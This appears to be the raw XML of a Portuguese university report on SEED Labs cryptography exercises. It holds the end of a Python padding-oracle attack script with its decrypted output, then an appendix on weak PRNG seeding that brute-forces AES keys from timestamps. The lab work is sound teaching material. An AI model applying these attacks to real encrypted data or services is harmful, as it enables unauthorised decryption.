        <w:t xml:space="preserve">        print(f"\n&gt;&gt;&gt; Bloco {bloco_atual} decifrado: {P.hex()}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63FBFDD9" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">        mensagem_completa = P.hex() + mensagem_completa</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55464C9E" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">        bloco_atual -= 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04F61AA0" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="70681BB4" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">    # Processar primeiro bloco (caso especial - usa IV)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64FBAF57" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">    print(f"\n{'='*60}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26828CA0" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">    print(f"Processando Bloco 1 (com IV)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79599ECD" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>print(f"{'='*60}\n")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E2E2604" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4B7557EC" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">    CC = bytearray(16)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FBAC4EF" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">    D = bytearray(16)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B21FA9C" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">    current_padding = "01"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11982132" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">    CC, D = decryptBlock(1, current_padding, CC, D, iv_and_ctext[16:32])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="143E2BA5" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>P = xor(D, IV)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="301D206D" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6871B403" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">    print(f"\n&gt;&gt;&gt; Bloco 1 decifrado: {P.hex()}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D13BCB1" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">    mensagem_completa = P.hex() + mensagem_completa</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="293AB7D5" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4CAB1EA6" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">    print(f"\n{'='*60}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BC3AFF4" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">    print(f"MENSAGEM COMPLETA")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D4201D2" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">    print(f"{'='*60}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="684CE1DA" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">    print(f"HEX: {mensagem_completa}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68815F1B" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:spacing w:after="283"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">    print(f"ASCII: {bytes.fromhex(mensagem_completa).decode('unicode_escape')}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="462A72C3" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="262" w:name="resultadodaexecuo"/>
      <w:bookmarkStart w:id="263" w:name="_Toc213874764"/>
      <w:bookmarkStart w:id="264" w:name="_Toc213882002"/>
      <w:bookmarkEnd w:id="262"/>
      <w:r>
        <w:t>Resultado da Execução</w:t>
      </w:r>
      <w:bookmarkEnd w:id="263"/>
      <w:bookmarkEnd w:id="264"/>
    </w:p>
    <w:p w14:paraId="65818884" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>[... processamento dos blocos ...]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="355F1C73" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1CD34238" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>============================================================</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FA01B08" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>MENSAGEM COMPLETA</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C3A070D" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>============================================================</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="092D7563" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>HEX: 285e5f5e29285e5f5e29205468652053454544204c616273206172652067726561742120285e5f5e29285e5f5e290202</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FFD0D97" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:spacing w:after="283"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">ASCII: (^_^)(^_^) The SEED Labs are great! </w:t>
      </w:r>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>(^_^)(^_^)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19FF1D4B" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pageBreakBefore/>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6B138C01" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pageBreakBefore/>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="67EEE052" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="5220A199" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="48E4556E" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AAE378C" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0895E6DB" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="79C60FBC" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="3E5697A2" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="1B03F0E7" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="013D999A" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="333A4798" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="5DD950DC" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="74FFE791" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="18638D87" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="3E394497" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="265" w:name="_Toc213874765"/>
      <w:bookmarkStart w:id="266" w:name="_Toc213882003"/>
      <w:r>
        <w:t>Apêndice G – Relatório SEED Labs — PRNG</w:t>
      </w:r>
      <w:bookmarkEnd w:id="265"/>
      <w:bookmarkEnd w:id="266"/>
    </w:p>
    <w:p w14:paraId="360938D0" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pageBreakBefore/>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1AD542E1" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="027377E0" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
        </w:rPr>
        <w:t>Resumo executivo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:t>Este relatório foi gerado a partir do conteúdo do ficheiro original 'relatorio_seedlab.txt'. Esta é apenas uma versão formatada e organizada das cinco tarefas executadas no laboratório, acompanhada das observações e resultados extraídos do log.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22CA8074" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="4DAE9ED6" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
        </w:rPr>
        <w:t>Tarefa 1 — Geração de chaves (resumo extraído)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F10472B" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Gerar Chave de Encriptação de Forma Incorreta</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>=========================================================</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E8704C6" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Primeira execução:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>=== COM srand(time(NULL)) ===</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Timestamp actual: 1762980862</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Chave: e4d6e1fddc43d18e06966f15deb8faf6</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CCF1D0F" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t>=== SEM srand (seed por defeito) ===</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Chave: 676868fb41ef3287e74a9f9e5dee8a41</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="409AAF7A" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Segunda execução (2 segundos depois):</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>=== COM srand(time(NULL)) ===</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Timestamp actual: 1762980864</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Chave: add0fae0fc234815aaaeefae98e24a8a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="094AABCC" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t>=== SEM srand (seed por defeito) ===</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Chave: 2072a104258a41739a0a1dec18181dc5</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10AD67BC" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t>OBSERVAÇÕES:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Com srand(time(NULL)): As chaves mudam entre execuções</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Sem srand: Mesma chave sempre (seed por defeito = 1)</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- time() retorna segundos desde a Época Unix (1970-01-01)</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Isto é FRACO: atacante pode fazer força bruta em timestamps recentes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67715ABB" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pageBreakBefore/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="02B2A40F" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
        </w:rPr>
        <w:t>Resumo de execuções (Tarefa 1):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A4C8B0C" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Timestamp actual: 1762980862 — Chave:  e4d6e1fddc43d18e06966f15deb8faf6</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="057F1CAA" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Chave: 676868fb41ef3287e74a9f9e5dee8a41 — Timestamp actual: 1762980864</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="787B4CF1" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Chave: add0fae0fc234815aaaeefae98e24a8a — Chave:  2072a104258a41739a0a1dec18181dc5</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D43B9AE" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="1A371311" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
        </w:rPr>
        <w:t>Tarefa 2 — Ataque de brute-force (resumo extraído)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DE33842" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Adivinhar a Chave (Ataque de bruteforce)</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>====================================================</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20F227F3" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Cenário: Alice encriptou um ficheiro em 2018-04-17 23:08:49</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Informação conhecida:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">  - Texto claro (cabeçalho PDF): 255044462d312e350a25d0d4c5d80a34</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">  - Texto cifrado: d06bf9d0dab8e8ef880660d2af65aa82</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">  - IV: 09080706050403020100A2B2C2D2E2F2</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">  - Algoritmo: AES-128-CBC</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">  - Janela temporal: 2 horas (7.200 chaves possíveis)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04F3654E" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Resultados do ataque:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>A fazer força bruta na chave de encriptação...</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Intervalo de tempo: 1523998129 a 1524005329 (7200 segundos)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08821484" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Testadas 7000 chaves...</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Chave não encontrada no intervalo</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Demonstração executada (quebra completa demoraria ~10-30 segundos)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0159C1C1" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t>ANÁLISE:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Apenas 7.200 timestamps possíveis para testar</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- CPU moderna consegue testar milhares por segundo</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Ataque tem sucesso em segundos, não em anos</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Demonstra porque seeding baseado em tempo é INSEGURO</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B6ACC9F" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pageBreakBefore/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7B38E2D9" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
        </w:rPr>
        <w:t>Parâmetros conhecidos:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5063AA93" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Commarcadores"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="360"/>
        </w:tabs>
      </w:pPr>
      <w:r>
        <w:t>Texto claro (cabeçalho PDF): 255044462d312e350a25d0d4c5d80a34</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A939A1A" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Commarcadores"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="360"/>
        </w:tabs>
      </w:pPr>
      <w:r>
        <w:t>Texto cifrado: d06bf9d0dab8e8ef880660d2af65aa82</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B8BA2F9" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Commarcadores"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="360"/>
        </w:tabs>
      </w:pPr>
      <w:r>
        <w:t>IV: 09080706050403020100A2B2C2D2E2F2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26F807E5" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Commarcadores"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="360"/>
        </w:tabs>
      </w:pPr>
      <w:r>
        <w:t>Algoritmo: AES-128-CBC</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1453A314" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Commarcadores"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="360"/>
        </w:tabs>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Janela temporal: 2 horas (7.200 chaves possíveis)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67A3E34C" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
        </w:rPr>
        <w:t>Resultados do ataque (excerto):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1553BAD2" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Intervalo de tempo: 1523998129 a 1524005329 (7200 segundos)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4832C675" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Testadas 7000 chaves...</w:t>
      </w:r>
